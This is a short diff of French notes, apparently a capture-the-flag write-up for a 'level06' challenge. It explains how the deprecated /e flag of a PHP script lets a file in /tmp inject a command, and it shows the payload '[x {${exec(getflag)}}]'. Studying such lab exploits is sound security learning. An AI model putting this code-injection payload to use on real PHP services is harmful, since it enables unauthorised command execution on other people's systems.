@@ -8,7 +8,7 @@ echo "test" > /tmp/test
 Le script repond "test"
 
 On peut donc exécuter une commande en mettant dans un fichier (présent dans tmp), /tmp/exploit par exemple :
-x {${exec(getflag)}}]
+[x {${exec(getflag)}}]
 
 Afin de tirer parti du flag /e, deprecated, du script level06.php
 
